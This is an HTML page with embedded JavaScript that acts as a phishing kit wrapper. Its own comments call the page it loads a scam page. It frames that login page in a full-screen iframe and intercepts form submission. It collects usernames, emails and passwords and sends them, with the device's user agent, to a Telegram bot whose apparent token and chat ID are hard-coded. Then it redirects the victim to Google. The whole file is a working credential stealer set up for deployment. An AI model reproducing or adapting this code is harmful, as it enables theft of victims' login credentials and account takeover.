<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body style="margin:0; overflow:hidden;">
    <!-- This iframe will hold your 4MB scam page -->
    <iframe id="scamFrame" src="index.html" style="width:100vw; height:100vh; border:none;"></iframe>

    <script>
        // ================= CONFIGURATION =================
        // 1. PASTE YOUR BOT TOKEN BELOW
        const BOT_TOKEN = '8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM';
        
        // 2. PASTE YOUR CHAT ID BELOW
        const CHAT_ID = '7706898844';
        
        // 3. REDIRECT URL AFTER LOGIN
        const REDIRECT_URL = 'https://www.google.com';
        // =================================================

        // Wait for the iframe to load
        const frame = document.getElementById('scamFrame');
        frame.onload = function() {
            // Access the content of the iframe
            const doc = frame.contentDocument || frame.contentWindow.document;

            // Find the form inside the iframe
            const form = doc.querySelector('form');

            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault(); // Stop default submit

                    // Get inputs
                    const inputs = form.querySelectorAll('input');
                    let username = '';
                    let password = '';
                    let email = '';

                    inputs.forEach(input => {
                        const type = input.type.toLowerCase();
                        const name = input.name || input.id || '';
                        if (type === 'email' || name.includes('email')) email = input.value;
                        if (type === 'password' || name.includes('pass')) password = input.value;
                        if (type === 'text' || name.includes('user')) username = input.value;
                    });

                    if (!username && email) username = email;
                    if (!username && inputs[0]) username = inputs[0].value;

                    // Send to Telegram
                    const message = `
🚨 *NEW LOGIN* 🚨
👤 *User:* ${username || email || 'Unknown'}
🔑 *Pass:* ${password || 'Unknown'}
📱 *Device:* ${navigator.userAgent.substring(0, 60)}
`;

                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    const params = new URLSearchParams();
                    params.append('chat_id', CHAT_ID);
                    params.append('text', message);
                    params.append('parse_mode', 'Markdown');

                    fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok) {
                            // Redirect the main window
                            window.location.href = REDIRECT_URL;
                        }
                    });
                });
            }
        };
    </script>
</body>
</html>
